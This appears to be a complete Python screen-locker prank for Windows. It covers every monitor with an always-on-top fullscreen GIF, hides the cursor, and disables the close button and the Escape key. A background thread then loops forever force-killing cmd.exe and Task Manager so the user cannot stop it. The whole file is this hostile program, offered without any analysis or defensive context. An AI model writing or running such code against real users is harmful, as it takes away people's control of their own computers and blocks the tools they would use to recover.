import tkinter as tk
from tkinter import Toplevel
from PIL import Image, ImageTk, ImageSequence
import screeninfo
import threading
import os

def display_gif_on_screen(screen, gif_path):
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.config(cursor="none", bg="black")

    root.geometry(f'{screen.width}x{screen.height}+{screen.x}+{screen.y}')

    img = Image.open(gif_path)
    lbl = tk.Label(root, bg="black")
    lbl.pack(expand=True)

    def update_frame(frame_idx):
        frame = ImageSequence.Iterator(img)[frame_idx]
        frame_image = ImageTk.PhotoImage(frame)
        lbl.config(image=frame_image)
        lbl.image = frame_image
        root.after(50, update_frame, (frame_idx + 1) % img.n_frames)

    update_frame(0)

    def disable_event():
        pass

    root.protocol("WM_DELETE_WINDOW", disable_event)
    root.bind("<Escape>", lambda e: None)

    root.mainloop()

def main():
    gif_path = "bill.gif"

    # Get all monitors
    screens = screeninfo.get_monitors()

    # Create a thread for each monitor
    threads = []
    for screen in screens:
        t = threading.Thread(target=display_gif_on_screen, args=(screen, gif_path))
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

def kill_apps():
    while True:
        os.system("taskkill /f /im cmd.exe && taskkill /f /im taskmgr.exe")

if __name__ == "__main__":

    t = threading.Thread(target=kill_apps)
    t.start()

    main()

